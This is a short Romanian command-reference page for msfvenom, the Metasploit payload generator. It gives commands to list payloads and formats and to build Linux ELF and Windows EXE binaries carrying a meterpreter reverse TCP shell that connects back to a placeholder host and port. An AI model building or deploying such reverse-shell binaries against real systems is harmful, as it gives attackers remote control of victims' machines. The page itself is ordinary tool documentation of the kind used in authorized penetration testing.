# msfvenom

> Generați manual sarcini utile pentru metasploit.
> Mai multe informaţii: <https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom>

- Lista sarcinilor utile:

`msfvenom -l payloads`

- Formatele listei:

`msfvenom -l formats`

- Afișează opțiunile de sarcină utilă:

`msfvenom -p {{payload}} --list-options`

- Creați un binar ELF cu un handler TCP invers:

`msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={{local_ip}} LPORT={{local_port}} -f elf > {{path/to/binary}}`

- Creați un binar EXE cu un handler TCP invers:

`msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={{local_ip}} LPORT={{local_port}} -f exe > {{path/to/binary.exe}}`
